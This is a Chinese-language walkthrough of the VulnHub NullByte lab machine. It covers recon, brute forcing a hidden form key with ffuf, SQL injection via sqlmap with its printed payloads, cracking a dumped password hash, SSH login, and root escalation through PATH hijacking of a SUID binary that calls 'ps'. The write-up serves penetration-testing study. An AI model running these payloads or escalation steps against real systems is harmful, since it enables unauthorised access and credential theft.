---
title: "vulnhub-NullByte-Writeup"
date: 2025-05-10 14:00:00 +0800
categories: [vulnhub, 系统渗透]
tags: [环境变量劫持, SQLI, 提权]
toc: true
description: https://www.vulnhub.com/entry/nullbyte-1,126/
---

# Recon

## Targeting

```shell
nmap -F 192.168.64.1/24
Nmap scan report for 192.168.64.6
Host is up (0.0044s latency).
Not shown: 98 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
111/tcp open  rpcbind
```
## Nmap

```shell
nmap -p- 192.168.64.6 -sV -Pn -n --min-rate=10000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 16:11 CST
Nmap scan report for 192.168.64.6
Host is up (0.00025s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
40949/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds
```

目标通过Apache中间件在80端口开放了http服务 在777端口运行了Openssh 可能供后续口令登录使用

![image-20250510142034157](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510142034157.png)

## Dirsearch

```shell
dirsearch -u http://192.168.64.6/
[14:24:50] 200 -    9KB - /phpmyadmin/index.php
[14:25:01] 200 -  113B  - /uploads/
[14:25:01] 200 -  113B  - /javascript/
```

有效的目录有三条 对应到威胁建模

- ~~phpmyadmin弱口令、已知漏洞~~
- ~~后门shell~~
- 敏感信息泄露

那么根据统筹学 dirsearch先继续扫描uploads目录 去看看phpmyadmin

...

/uploads/目录扫描无果

# Exploit phpmyadmin

## version disclousure

![image-20250510143337562](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510143337562.png)

弱口令尝试无果 进行版本测绘发现通用的收集方法都被作者删除了 拿nday打不通 那么需要重新整理思路了

```
readme.php
README
changelog.php
Change
Documetation.html
Documetation.txt
translators.html
```

# Recon again

按照前面的思路一套打下来都没有结果 说明信息收集做得不够

## Exiftool

重新回到首页观察 把main.gif拉下来通过exiftool分析

在Comment注释中发现`kzMb5nVYJw`字符 尝试将其拼接到url中

![image-20250510160112658](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510160112658.png)

得到一个输入key的界面 尝试进行爆破

![image-20250510160206449](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510160206449.png)

## FUZZ

使用ffuf工具进行爆破，一定要指定`Content-type`，然后过滤掉`response size 244`

```shell
ffuf -w rockyou.txt -u http://192.168.64.6/kzMb5nVYJw/index.php -X POST -d "key=FUZZ" -fs 244 -t 
1000 -r -H "Content-Type: application/x-www-form-urlencoded"
________________________________________________
 :: Method           : POST
 :: URL              : http://192.168.64.6/kzMb5nVYJw/index.php
 :: Wordlist         : FUZZ: /Users/may/sec-tools/Blasting_dictionary/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : key=FUZZ
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1000
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 244
________________________________________________

elite                   [Status: 200, Size: 145, Words: 9, Lines: 7, Duration: 132ms]
```

最终得到elite 尝试该key

来到了一个输入username进行data fetch的功能点 试试SQLI

![image-20250510160402458](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510160402458.png)


# Shell as ramses
## SQLI

发现存在多个注入类型 那么直接跑数据

```shell
sqlmap -u http://192.168.64.6/kzMb5nVYJw/420search.php\?usrtosearch\=1 --batch --dbms=mysql
---
Parameter: usrtosearch (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usrtosearch=1" OR NOT 3376=3376#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: usrtosearch=1" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71707a7071,(SELECT (ELT(3409=3409,1))),0x7178766271,0x78))s), 8446744073709551610, 8446744073709551610)))-- wBuC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usrtosearch=1" AND (SELECT 9101 FROM (SELECT(SLEEP(5)))jnXE)-- sCga

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: usrtosearch=1" UNION ALL SELECT CONCAT(0x71707a7071,0x53664a777174466e4f646f596669695469617a474d6e50505258646c4f5561445877594f42747462,0x7178766271),NULL,NULL#
---
```

在seth数据库users表中得到一个有效用户ramses

```shell
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
```

pass像base64 尝试解码

```shell
echo YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE|base64 -d
c6d6bd7ebf806f43c76acc3681703b
```

解码得到的似乎是md5 使用cmd5解密 得到omega

![image-20250510160812355](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510160812355.png)

该用户肯定不是phpmyadmin的用户 目标也没有其他系统 那么只可能是系统用户了

尝试通过777端口登录ssh

![image-20250510161322968](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510161322968.png)

得到初始权限 进行一波信息收集 发现执行过/var/www/backup/procwatch

<img src="https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510161512011.png" alt="image-20250510161512011" style="zoom:50%;" />

发现该文件是具有suid权限的 

<img src="https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510161739961.png" alt="image-20250510161739961" style="zoom:50%;" />

检查输出发现应该是执行了ps命令

![image-20250510161814366](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510161814366.png)

通过`objdump -d procwatch`对`procwatch`进行反汇编，查看main函数反汇编信息

```shell
080483fb <main>:
 80483fb:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 80483ff:	83 e4 f0             	and    $0xfffffff0,%esp
 8048402:	ff 71 fc             	pushl  -0x4(%ecx)
 8048405:	55                   	push   %ebp
 8048406:	89 e5                	mov    %esp,%ebp
 8048408:	51                   	push   %ecx
 8048409:	83 ec 44             	sub    $0x44,%esp
 804840c:	8d 45 c6             	lea    -0x3a(%ebp),%eax
 804840f:	66 c7 00 70 73       	movw   $0x7370,(%eax)
 8048414:	c6 40 02 00          	movb   $0x0,0x2(%eax)
 8048418:	83 ec 0c             	sub    $0xc,%esp
 804841b:	8d 45 c6             	lea    -0x3a(%ebp),%eax
 804841e:	50                   	push   %eax
 804841f:	e8 ac fe ff ff       	call   80482d0 <system@plt>
 8048424:	83 c4 10             	add    $0x10,%esp
 8048427:	b8 00 00 00 00       	mov    $0x0,%eax
 804842c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 804842f:	c9                   	leave  
 8048430:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8048433:	c3                   	ret    
 8048434:	66 90                	xchg   %ax,%ax
 8048436:	66 90                	xchg   %ax,%ax
 8048438:	66 90                	xchg   %ax,%ax
 804843a:	66 90                	xchg   %ax,%ax
 804843c:	66 90                	xchg   %ax,%ax
 804843e:	66 90                	xchg   %ax,%a
```

其主要逻辑如下

```shell
080483fb <main>:
 80483fb:	8d 4c 24 04          	lea    0x4(%esp),%ecx         ; 获取参数地址
 80483ff:	83 e4 f0             	and    $0xfffffff0,%esp       ; 栈对齐
 8048402:	ff 71 fc             	pushl  -0x4(%ecx)             ; 压入 `argv[0]`
 8048405:	55                   	push   %ebp
 8048406:	89 e5                	mov    %esp,%ebp
 8048408:	51                   	push   %ecx
 8048409:	83 ec 44             	sub    $0x44,%esp             ; 分配栈空间
 804840c:	8d 45 c6             	lea    -0x3a(%ebp),%eax       ; 定位变量地址
 804840f:	66 c7 00 70 73       	movw   $0x7370,(%eax)         ; 写入 "ps"
 8048414:	c6 40 02 00          	movb   $0x0,0x2(%eax)         ; 写入 '\0'
 8048418:	83 ec 0c             	sub    $0xc,%esp
 804841b:	8d 45 c6             	lea    -0x3a(%ebp),%eax       ; 参数准备
 804841e:	50                   	push   %eax                    ; 把 "ps" 字符串地址压栈
 804841f:	e8 ac fe ff ff       	call   80482d0 <system@plt>   ; 调用 system("ps")
 8048424:	83 c4 10             	add    $0x10,%esp             ; 清理参数
 8048427:	b8 00 00 00 00       	mov    $0x0,%eax              ; 返回值 0
 804842c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 804842f:	c9                   	leave  
 8048430:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8048433:	c3                   	ret
```

这个程序实际是

```c
int main() {
    system("ps");
    return 0;
}
```

# Shell as root

## Environment Variable Hijacking

前面通过分析已得知procwatch执行了ps命令 那么可以通过环境变量劫持提权 可以看到成功提权到root

![image-20250510170913058](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510170913058.png)

但在这个中发现使用bash替代sh会提权失败 稍后再进行分析

![image-20250510171022299](https://mayss.oss-cn-beijing.aliyuncs.com/image/image-20250510171022299.png)

# Think

- 为什么$0x7370等效于0x73 0x70

  movw   $0x7370,(%eax) 这段代码使用的是`movw`移动一个16位(2字节)的立即数`0x7370`到`%eax`所指的位置

- 为什么是`ps`而不是`sp`

  `0x73`与`0x70`分别对应ascii字符`s`和`p` 那为什么程序执行的是ps呢？

  此处涉及到二进制的**大端序**与**小端序**问题 使用`file`命令能看到`procewatch`为`LSB` 即`Little Endian`

  ```shell
  ramses@NullByte:/var/www/backup$ file ./procwatch
  ./procwatch: setuid ELF 32-bit LSB executable, Intel 80386
  ```

  在小端系统中，多字节数据在内存中是低字节在前（低地址）高字节在后（高地址）

  ```c
  0x7370  =  2字节：
  高字节：0x73
  低字节：0x70
  那么写入内存的顺序是：
  [0x70][0x73]
  也就是ps
  ```

- 为什么bash提权不成功？

  这是由于在`bash 4.2+`的版本中，当bash检测到自己被以`suid`启动时，会自动放弃root权限（一种安全设计）

  ```c
  if (running_setuid || running_setgid)
  {
      disable_priv_mode ();  // 放弃特权
      ...
  }
  ```

  而sh一般被link到dash之类的shell 这类shell目前没有类似的机制 所以可以被suid提权利用

